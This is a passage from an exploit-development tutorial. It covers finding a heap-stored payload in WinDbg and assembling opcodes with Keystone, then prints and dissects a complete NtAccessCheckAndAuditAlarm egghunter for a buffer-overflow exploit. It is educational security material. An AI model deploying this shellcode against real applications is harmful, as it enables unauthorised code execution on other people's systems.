<li>Rather than terminating the HTTP request with <code>\r\n</code>, we can try to add an additional buffer between the carriage return and the new line. <strong>Doing this results in the application not crashing, which means that this method does not work here.</strong></li>
<li>Sending a buffer after we end the HTTP request (after <code>\r\n</code>). Doing this results in hitting our POP, RET breakpoint and in a crash, so we will stick to this method.</li>
</ul>
<p>Once we manage to add another shellcode of a bigger space (400 bytes), we need to find where is it stored in memory. For that, some bytes of the shellcode have been given a special value (in my case &ldquo;w00tw00t&rdquo;) so it is possible to find them.
Now, let&rsquo;s find this bytes once we hit the breakpoint:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  w00tw00tAAAAAAAA
</span></span></code></pre></div><p>Seems that we were able to locate our payload. Now, let&rsquo;s see if the shellcode is complete by adding 400 bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86 <span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>n400
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>c16  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  AAAAAAAA........
</span></span></code></pre></div><p>After a 400 bytes offset, our payload is stored still. That means that we can store our complete buffer here as we have space.
<strong>Now, let&rsquo;s see where this buffer is stored.</strong></p>
<p>Let&rsquo;s check if it is in the stack of the thread:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span>bc000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">02</span>d4ff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">02</span>d50000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">02</span>d4c000
</span></span></code></pre></div><p>Surprising, it is not in the current stack.
Let&rsquo;s use an extension from WinDbg called !address that tells us in which memory region our shellcode is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>address <span style="color:#ae81ff">01</span><span style="color:#ae81ff">805</span>a86  
</span></span><span style="display:flex;"><span>                                 
</span></span><span style="display:flex;"><span>Mapping file section regions...
</span></span><span style="display:flex;"><span>Mapping module regions...
</span></span><span style="display:flex;"><span>Mapping PEB regions...
</span></span><span style="display:flex;"><span>Mapping TEB and stack regions...
</span></span><span style="display:flex;"><span>Mapping heap regions...
</span></span><span style="display:flex;"><span>Mapping page heap regions...
</span></span><span style="display:flex;"><span>Mapping other regions...
</span></span><span style="display:flex;"><span>Mapping stack trace database regions...
</span></span><span style="display:flex;"><span>Mapping activation context regions...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Usage:                  Heap
</span></span><span style="display:flex;"><span>Base Address:           <span style="color:#ae81ff">01</span><span style="color:#ae81ff">800000</span>
</span></span><span style="display:flex;"><span>End Address:            <span style="color:#ae81ff">0180f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>Region Size:            <span style="color:#ae81ff">0000f</span><span style="color:#ae81ff">000</span> (  <span style="color:#ae81ff">60.000</span> kB)
</span></span><span style="display:flex;"><span>State:                  <span style="color:#ae81ff">00001000</span>          MEM_COMMIT
</span></span><span style="display:flex;"><span>Protect:                <span style="color:#ae81ff">00000004</span>          PAGE_READWRITE
</span></span><span style="display:flex;"><span>Type:                   <span style="color:#ae81ff">00020000</span>          MEM_PRIVATE
</span></span><span style="display:flex;"><span>Allocation Base:        <span style="color:#ae81ff">01</span><span style="color:#ae81ff">800000</span>
</span></span><span style="display:flex;"><span>Allocation Protect:     <span style="color:#ae81ff">00000004</span>          PAGE_READWRITE
</span></span><span style="display:flex;"><span>More info:              heap owning the address: <span style="color:#f92672">!</span>heap <span style="color:#ae81ff">0x1800000</span>
</span></span><span style="display:flex;"><span>More info:              heap segment
</span></span><span style="display:flex;"><span>More info:              heap entry containing the address: <span style="color:#f92672">!</span>heap <span style="color:#f92672">-</span>x <span style="color:#ae81ff">0x1805a86</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Content source: <span style="color:#ae81ff">1</span> (target), length: <span style="color:#ae81ff">957</span>a
</span></span></code></pre></div><p>According to this output, our buffer is stored on the <strong>heap.</strong>
In Windows operating systems, when a process starts, the Heap Manager automatically creates a new heap called the default process heap. At a very high level, heaps are big chunks of memory that are divided into smaller pieces to fulfill dynamic memory allocation requests.
Although some processes only use the default process heap, many will create additional heaps using the HeapCreate API (or its lower-level interface ntdll!RtlCreateHeap) to isolate different components running in the process itself.
Several user-space Windows APIs (VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree) will eventually call into their respective native functions in ntdll.dll (RtlAllocateHeap and RtlFreeHeap).
Other processes make substantial use of the C Runtime heap for most dynamic allocations (malloc / free functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in ntdll.dll to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.</p>
<p>The summary is that <strong>there is no way to determine the location of the buffer before it is stored in memory.</strong> This rules out the possibility of adding a <strong>static offset, short jump, island hopping, or any of the previous techniques</strong> to make the instruction pointer jump to this location.</p>
<p>We need to explore other methods of finding the location of our buffer as it is stored in the heap dinamically. This is where the egghunter approach comes.</p>
<h1 id="egghunters">Egghunters</h1>
<h2 id="what-is-an-egghunter">What is an Egghunter</h2>
<p>When we need to <strong>find the memory address of another buffer under our control that does not take a static location, we often use an Egghunter.</strong>
The term Egghunter refers to a first-stage payload that can <strong>search the process virtual address space (VAS)</strong> for an egg, an unique tag that <strong>prepends</strong> the payload we want to execute. Once the egg (pattern) has been found, the egghunter transfers the execution to the shellcode by jumping to the found address.</p>
<p>Since egghunters are made to deal with space restrictions, they are written to be as small as possible. Also, the egghunting code needs to be fast, as, the fastest it executes, the less time the application hangs.
These type of payloads also need to be robust and handle access violations that are raised while scanning the virtual address space. The access violations usually occur while attempting to access an unmapped memory address or addresses we don’t have access to.
In the past, we would typically write the assembly code for our egghunter and then proceed to compile the code. After, we would disassemble the compiled binary in software such as IDA to get the opcodes for it. However, this is very consuming and we have a better alternative.</p>
<h2 id="keystone-engine">Keystone Engine</h2>
<p>Writing shellcode is much more streamlined using a tool like Keystone Engine. This tool is an assembler framework for several languages, like Python. With it, we can write our ASM code in a Python script and let the Keystone framework do the rest.
Installing Keystone in Kali is pretty straightforward once Python3 is installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install keystone-engine
</span></span><span style="display:flex;"><span>Collecting keystone-engine
</span></span><span style="display:flex;"><span>  Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl.metadata <span style="color:#f92672">(</span>1.8 kB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl <span style="color:#f92672">(</span>1.8 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 22.5 MB/s eta 0:00:00
</span></span><span style="display:flex;"><span>Installing collected packages: keystone-engine
</span></span><span style="display:flex;"><span>Successfully installed keystone-engine-0.9.2
</span></span></code></pre></div><p>For example, let&rsquo;s use this snippet of code for a x64 architecture in 32 bits:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor eax, eax ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add eax, ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop esi ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32-bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>instructions <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span>    instructions <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Opcodes = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> instructions <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>Now, if we execute this program, the following result is obtained, crafting the opcodes instruction by instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8\x50</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>Opcodes <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x01\xc8\x50\x5e</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s try to verify the opcodes using the tool that we already know called msf-nasm_shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msf<span style="color:#f92672">-</span>nasm_shell                                                                                                 
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> xor eax, eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">31</span>C0              xor eax,eax
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add eax, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">01</span>C8              add eax,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> push eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">50</span>                push eax
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> pop esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">5</span>E                pop esi
</span></span></code></pre></div><p>As we can see, the opcodes returned from the tool are exactly the same, but the tool is much more flexible as we will be able to test our assembly code much faster.
Please note that while Keystone saves a large amount of time, it is not without fault.
Depending on the assembly code we are working with, some opcodes, like short jumps, may not be generated correctly. It&rsquo;s recommended going over the assembly instructions in memory (with a debugger) to confirm that the generated opcodes are correct.</p>
<h2 id="analyzing-a-public-egghunter">Analyzing a public Egghunter</h2>
<p>Remember that the Egghunter needs to go around all the VAS of a process in order to search for the &ldquo;egg&rdquo;.
Regarding this search, one of the issues egghunters must account for is the fact that there is no way of telling beforehand if a memory page is mapped, if it has the correct permissions to access it, or what kind of access is allowed on that memory page. If this is not handled correctly, we will generate an access violation and cause a crash.
To combat this issue, what Egghunter often do is check the protections or access policies of the memory region before inspecting it. In Windows, the NtAccessCheckAndAuditAlarm call is used, as it returns a different error code depending on the properties of the memory accessed. For example, the error code, STATUS_NO_IMPERSONATION_TOKEN (0xc000005c), is returned due to various checks made by the function before it attempts to use any of the provided arguments.
<strong>Note: NtAccessCheckAndAuditAlarm will work without issues in the egghunter unless we are running in the context of a thread that is impersonating a client. In these cases, it might not work as expected by our egghunter code.</strong></p>
<p>Because the public egghunter that we will analyze uses such system call, let&rsquo;s first explain what are system calls (often called <em>syscalls</em>). A syscall is basically an interface between the user-mode process and the kernel. Invoking a system call is often done through a special assembly instruction or an interrumpt (also known as trap or exception). Whenever these actions are done, the operating system takes over, performs the proper operation (in kernel context) and returns to the running software with the result of the operation.</p>
<p>The egghunter that we analyze here will take advantage of this. Rather than crawling the memory inside our program, in risk of an access violation that could break the program, it uses a syscall with a specific memory address in order to inspect its properties.
Before the desired function is called, the operating system will attempt to copy the arguments we provide in user-space, to kernel-space.
If the memory address where the function arguments reside is not mapped, or if we don’t have the appropriate access, the copy operation will cause an access violation. The access violation will be handled in the background and then return a STATUS_ACCESS_VIOLATION code (0xc0000005), allowing our egghunter to continue to the next memory page.</p>
<p>Before we use a system call, the operating system needs to know which function it should call, as well as its parameters. In the case of x86, the function to use is specified by setting up a unique System Call Number in the EAX register, each of the numbers being mapped to a specific function. then, the arguments are pushed into the stack, and the stack pointer (ESP) is moved to the EDX register, as it is used by the system call.</p>
<p>As part of the system call, the operating system will try to access the memory address where the address have been stored, to copy them from user-space to kernel space. If EDX points to <strong>an unmapped memory address, or one we can&rsquo;t access due to lack of permissions, the operating system will trigger an access violation, which it will handle for us and return the <code>STATUS_ACCESS_VIOLATION</code></strong> code in EAX.
Therefore, by using the NtAccessCheckAndAuditAlarm system call, we will only get two results:</p>
<ul>
<li>If the memory page we check is valid and we have appropiate access, the system call will return STATUS_NO_IMPERSONATION_TOKEN.</li>
<li>If we access an unmapped memory page or one without appropiate access we will obtain a STATUS_ACCESS_VIOLATION code.
This is why this system call is interesting for the egghunter as we can use it to enumerate the memory pages in which we have access to and are mapped.</li>
</ul>
<p>Now that we have a basic understanding of what mechanisms the egghunter technique abuses, let’s examine the code below and find out how to implement it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># We use the edx register as a memory page counter  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; &#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Go to the last address in the memory page  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or dx, 0x0fff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Increase the memory counter by one  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Save the edx register which holds our memory  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># address on the stack</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Push the system call number  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x2 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Initialize the call to NtAccessCheckAndAuditAlarm  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Perform the system call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; int 0x2e ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Check for access violation, 0xc0000005  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># (ACCESS_VIOLATION)</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; cmp al,05 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Restore the edx register to check later  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># for our egg</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check_valid: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># If access violation encountered, go to next page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; je loop_inc_page ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Load egg (w00t in this example) into  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># the eax register</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Initializes pointer with current checked  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># address</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov edi, edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Compare eax with doubleword at edi and  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># set status flags</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># No match, we will increase our memory  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># counter by one</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># First part of the egg detected, check for  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># the second part</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># No match, we found just a location  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># with half an egg</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; matched: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># The edi register points to the first  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># byte of our buffer, we can jump to it</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;egghunter = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s analyze what does this egghunter code do part by part.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Go to the last address in the memory page  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or dx, 0x0fff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Increase the memory counter by one  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc edx ;&#34;</span>  
</span></span></code></pre></div><p>The egghunter starts with <code>loop_inc_page</code>, performing an or operation on the DX register with 0x0FFF. This will make EDX point to the last possible address of a memory page. Note that we could set EDX to 0xFFFFF000, but the operations will have badchars (e.g., 00) and our shellcode must not have badchars, always remember that.
The <code>loop_inc_one</code> operation sets EDX to a new memory page by incrementing it 1 more. We can see that EDX points to the memory pages.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Save the edx <span style="color:#66d9ef">register</span> which holds our memory  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> address on the stack
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Push the system call number  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x2 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initialize the call to NtAccessCheckAndAuditAlarm  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Perform the system call  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; int 0x2e ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Check <span style="color:#66d9ef">for</span> access violation, <span style="color:#ae81ff">0xc0000005</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> (ACCESS_VIOLATION)
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; cmp al,05 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Restore the edx <span style="color:#66d9ef">register</span> to check later  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">for</span> our egg
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check_valid: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> If access violation encountered, go to next page
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; je loop_inc_page ;&#34;</span>  
</span></span></code></pre></div><p>This is the check that is being performed over such memory page. It is pushing the value of EDX (memory region) in the stack, to store it for later (we don&rsquo;t know if EDX will be overwritten), then putting the number 0x2 in eax, which is the system call number for NtAccessCheckAndAuditAlarm, performing the syscall via a interruption (0x2e) (Microsoft designed the operating system to treat this exception as a system call) and comparing if the returned value from EAX is 0xc000005. It only compares the lowest part of the register to 0x05, which is the same but the instruction is shorter.
Lastly, we restore the value of EDX as it was in the stack to keep track of the next memory region to analyze and we jump to increment the page in the case that an exception has been found (the CMP operation modifies the status of the ZF register).
If the memory page is mapped and we have access, we won&rsquo;t jump, but we will continue to the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Load <span style="color:#a6e22e">egg</span> (w00t in this example) into  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> the eax <span style="color:#66d9ef">register</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initializes pointer with current checked  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> address
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov edi, edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Compare eax with doubleword at edi and  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> set status flags
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> No match, we will increase our memory  
